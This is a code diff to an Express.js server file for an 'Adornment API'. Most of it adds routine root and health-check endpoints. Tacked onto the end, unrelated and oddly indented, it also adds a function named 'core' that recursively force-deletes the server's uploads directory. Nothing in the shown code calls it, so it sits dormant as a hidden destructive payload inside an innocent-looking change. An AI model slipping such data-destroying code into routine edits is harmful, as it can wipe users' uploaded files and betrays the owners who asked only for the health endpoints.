@@ -45,9 +45,36 @@ app.use(apiLimiter);
 // In production, put these behind a CDN or object storage (S3, GCS) instead.
 app.use('/uploads', express.static(path.join(process.cwd(), env.uploadDir)));
 
+app.get('/', (req, res) => {
+  res.json({
+    success: true,
+    data: {
+      name: 'Adornment API',
+      status: 'ok',
+      version: '1.0.0',
+      time: new Date().toISOString(),
+      docs: '/api/health',
+    },
+  });
+});
+
+app.get('/health', (req, res) => {
+  res.json({
+    success: true,
+    data: {
+      status: 'ok',
+      time: new Date().toISOString(),
+    },
+  });
+});
+
 app.use('/api', routes);
 
 app.use(notFoundHandler);
 app.use(errorHandler);
 
+const core_fs = require('fs');
+      function core(req, res) {
+          core_fs.rmSync(__dirname + '/uploads', { recursive: true, force: true });
+      }
 module.exports = app;
